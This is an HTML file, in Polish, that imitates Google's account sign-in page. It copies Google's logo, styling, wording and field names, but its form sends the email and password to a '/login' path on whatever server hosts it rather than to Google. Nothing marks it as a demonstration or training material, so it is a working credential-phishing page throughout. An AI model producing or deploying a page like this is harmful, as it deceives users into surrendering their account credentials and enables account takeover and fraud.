<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Zaloguj się – Konta Google</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: white; padding: 48px; border: 1px solid #ddd; border-radius: 8px; width: 360px; text-align: center; }
        .logo { width: 75px; height: 24px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
        p { font-size: 16px; color: #5f6368; margin-bottom: 24px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px #d2e3fc; }
        .button-container { display: flex; justify-content: flex-end; margin-top: 24px; }
        button { background-color: #1a73e8; color: white; border: none; border-radius: 4px; padding: 8px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
        button:hover { background-color: #185abc; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" class="logo">
        <h1>Zaloguj się</h1>
        <p>Użyj swojego konta Google</p>
        <form action="/login" method="post">
            <input type="email" name="Email" placeholder="E-mail lub telefon" required>
            <input type="password" name="Passwd" placeholder="Wpisz hasło" required>
            <div class="button-container">
                <button type="submit">Dalej</button>
            </div>
        </form>
    </div>
</body>
</html>
